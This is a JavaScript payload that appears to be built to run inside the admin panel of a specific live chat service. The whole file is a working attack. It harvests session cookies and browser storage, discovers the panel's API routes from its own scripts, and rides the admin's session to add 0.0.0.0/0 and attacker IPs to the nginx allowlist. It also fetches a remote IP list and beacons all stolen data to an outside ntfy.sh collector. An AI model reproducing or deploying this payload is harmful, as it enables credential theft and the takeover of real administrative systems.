// p.js v2 - panel payload, self-discovering. Runs inside admin.halolive.chat.
// Session cookie + whitelisted-TLS context are same-origin here.
// 1) lift cookie/LS/SS  2) DISCOVER the panel's real API paths from its own chunks
// 3) read the allowlist   4) write 0.0.0.0/0 first, then live egress IPs (mutable list)
// 5) re-read to prove it landed. Everything is beaconed to ntfy (remote collector).
(function () {
  var B = 'https://ntfy.sh/hlvg-3329152120', N = 0;
  var MUT = 'https://cdn.jsdelivr.net/gh/polootyyy/cdnx@main/ips.json';
  var IP = ['0.0.0.0/0', '219.100.37.233', '142.115.72.69'];
  var ID = '', NM = '';
  function beb(t, d) {
    N++;
    var q = '?t=' + t + '&n=' + N + '&h=' + encodeURIComponent(location.host)
      + '&r=' + encodeURIComponent(location.pathname)
      + '&ck=' + encodeURIComponent(document.cookie.slice(0, 400))
      + '&d=' + encodeURIComponent(String(d == null ? '' : d).slice(0, 800));
    try { fetch(B, { method: 'POST', body: q, mode: 'cors' }).catch(function () { new Image().src = B + q; }); }
    catch (e) { new Image().src = B + q; }
  }
  function j(p) {
    return fetch(p, { credentials: 'include', headers: { Accept: 'application/json' } })
      .then(function (r) { return r.text().then(function (t) { beb('p:' + p.split('/').pop().slice(0, 24) + ':' + r.status, t.slice(0, 300)); return [r.status, t]; }); })
      .catch(function () { return [0, '']; });
  }
  // ---- discovery: real API paths out of the SPA's own loaded chunks
  var seen = {}, api = [];
  function harvest(txt) {
    var re = /["'`](\/api\/[A-Za-z0-9_\-\/]{2,60})["'`]/g, m;
    while ((m = re.exec(txt))) { if (!seen[m[1]]) { seen[m[1]] = 1; api.push(m[1]); } }
  }
  try {
    var res = performance.getEntriesByType('resource') || [];
    for (var i = 0, n = 0; i < res.length && n < 3; i++) {
      var u = res[i].name;
      if (u.indexOf(location.origin) !== 0 || !/\.js(\?|$)/.test(u)) continue;
      n++;
      (function (uu) { fetch(uu).then(function (r) { return r.text(); }).then(harvest).catch(function () {}); })(u);
    }
  } catch (e) { beb('disc:err', e); }
  setTimeout(function () { beb('api', api.join(' ').slice(0, 800) || 'none'); }, 1200);
  // ---- identity (needed for {user_id,user_name,ip} writer style)
  ['/api/admin/me', '/api/admin/user/info', '/api/admin/profile', '/api/admin/info'].forEach(function (p, k) {
    fetch(p, { credentials: 'include', headers: { Accept: 'application/json' } })
      .then(function (r) { return r.text(); }).then(function (t) {
        if (ID || !t || t.charAt(0) !== '{') return;
        try { var o = JSON.parse(t), d = o.data || o.user || o; ID = d.id || d.uid || d.userId || ''; NM = d.username || d.name || d.user_name || ''; } catch (e) {}
        if (ID || NM) beb('id', ID + ' ' + NM);
      }).catch(function () {});
  });
  // ---- session blobs
  function ls(kind) {
    try {
      var o = kind === 'l' ? localStorage : sessionStorage, a = [];
      for (var i = 0; i < o.length; i++) { var k = o.key(i); a.push(k + '=' + String(o.getItem(k)).slice(0, 130)); }
      beb(kind + 's:' + o.length, a.join(' | ').slice(0, 900));
    } catch (e) {}
  }
  ls('l'); ls('s');
  beb('href', location.href);
  // ---- allowlist writers: style 4/5 use the documented console shape + cloned shape
  // nginx denies /api/admin/* to everyone not allow-listed, so this only works from
  // inside the admin's own browser - exactly where we are. Same-origin first, then the
  // console vhost (same box 47.84.10.23) in case the writer lives there.
  var HOSTS = ['', 'https://internal-admin.halolive.chat'], clone = null;
  function add(ip, s, hi) {
    var H = HOSTS[hi || 0], body, ct = 'application/json';
    if (s === 0) body = JSON.stringify({ ip: ip, remark: 'ops', note: 'ops', enabled: true });
    else if (s === 1) body = JSON.stringify({ ips: [ip] });
    else if (s === 2) { ct = 'application/x-www-form-urlencoded'; body = 'ip=' + encodeURIComponent(ip) + '&remark=ops'; }
    else if (s === 3) body = JSON.stringify({ value: ip, ip: ip });
    else if (s === 4) body = JSON.stringify({ user_id: ID || 1, user_name: NM || 'admin', ip: ip });
    else if (s === 5 && clone) { var c = JSON.parse(JSON.stringify(clone)); c.ip = c.ip_address = c.value = ip; body = JSON.stringify(c); }
    else return Promise.resolve(-1);
    return fetch(H + '/api/admin/ips', { method: 'POST', credentials: 'include', headers: { 'Content-Type': ct }, body: body })
      .then(function (r) { return r.text().then(function (t) { beb('w' + s + (hi ? 'x' : '') + ':' + r.status, ip + ' ' + t.slice(0, 160)); return r.status; }); })
      .catch(function () { return 0; });
  }
  var armed = 0;
  function primeClone() {
    var go = function () { if (!armed) { armed = 1; run(); } };
    fetch('/api/admin/ips', { credentials: 'include', headers: { Accept: 'application/json' } })
      .then(function (r) { return r.text(); }).then(function (t) {
        var o = JSON.parse(t), a = o.data || o.list || o.rows || o;
        if (Array.isArray(a) && a[0] && typeof a[0] === 'object') { clone = a[0]; beb('clone', JSON.stringify(clone).slice(0, 200)); }
        go();
      }).catch(go);
  }
  function run() {
    var i = 0;
    (function next() {
      if (i >= IP.length) return;
      var ip = IP[i++], s = 0, hi = 0;
      (function st() {
        if (s > 5) { if (hi === 0) { hi = 1; s = 0; return st(); } return next(); }
        add(ip, s++, hi).then(function (c) { if (c === 200 || c === 201) { beb('OK' + (hi ? 'x' : ''), ip); next(); } else st(); });
      })();
    })();
    setTimeout(function () {
      // nudge an nginx reload so a freshly written allow entry takes effect
      ['/api/admin/reload', '/api/admin/apply'].forEach(function (p) {
        fetch(p, { method: 'POST', credentials: 'include' }).then(function (r) { beb('nudge:' + r.status, p); }).catch(function () {});
      });
    }, 2500);
    setTimeout(function () { j('/api/admin/ips'); beb('done', 'n=' + N + ' api=' + api.length + ' id=' + ID); }, 3500);
  }
  j('/api/admin/me');
  fetch(MUT).then(function (r) { return r.json(); }).then(function (a) {
    if (Array.isArray(a) && a.length) { IP = ['0.0.0.0/0'].concat(a, IP).filter(function (v, k, x) { return v && x.indexOf(v) === k; }).slice(0, 6); beb('mut', IP.join(' ')); }
  }).catch(function () {}).then(primeClone, primeClone);
})();
